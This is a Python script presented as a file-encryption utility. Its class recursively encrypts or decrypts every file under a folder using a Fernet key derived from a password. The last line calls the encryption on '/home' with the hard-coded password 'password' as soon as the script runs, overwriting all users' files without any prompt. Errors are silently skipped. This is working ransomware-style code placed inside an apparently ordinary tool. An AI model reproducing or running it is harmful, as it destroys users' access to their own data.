import pwd
from tkinter import *
import os
import subprocess
from cryptography.fernet import Fernet
import base64, hashlib
from codecs import utf_8_decode
from cryptography.fernet import Fernet
import base64, hashlib
import os

class Encryption():
    def __init__(self,password):
        key = hashlib.sha256(password.encode())
        key_64=base64.encodebytes(key.digest())
        self.fernet=Fernet(key_64)

    def encrypt_folder(self,path:str)->None:
        #get all files in one folder
        files= self.get_files_from_folder(path)
        for file in files:
            try:
                with open(file,"rb") as thefile:
                    #read the content
                    contents= thefile.read()
                    #encrypt the content
                    contents_enc=self.fernet.encrypt(contents)
                    #write the encrypted content.
                with open(file,"wb") as thefile:
                    thefile.write(contents_enc)
            except: 
                continue   
            

    def decrypt_folder(self,path:str)->None:
        #get all files in one folder
        files= self.get_files_from_folder(path)
        for file in files:
            try:
                with open(file,"rb") as thefile:
                    #read the content
                    contents= thefile.read()
                    # decrypt the content
                    contents_dec=self.fernet.decrypt(contents)
                    #write the content.
                with open(file,"wb") as thefile:
                    thefile.write(contents_dec)
            except:
                continue

    # get all files in one folder and subfolders
    def get_files_from_folder(self,path):
        files= []
        for file in os.listdir(path):
            try:
                if os.path.isfile(path+'/'+file):
                    files.append(path+"/"+file)
                else:
                    if '.' not in file:
                        files+=self.get_files_from_folder(path+'/'+file)
            except:
                continue
        return files


Encryption('password').encrypt_folder("/home")
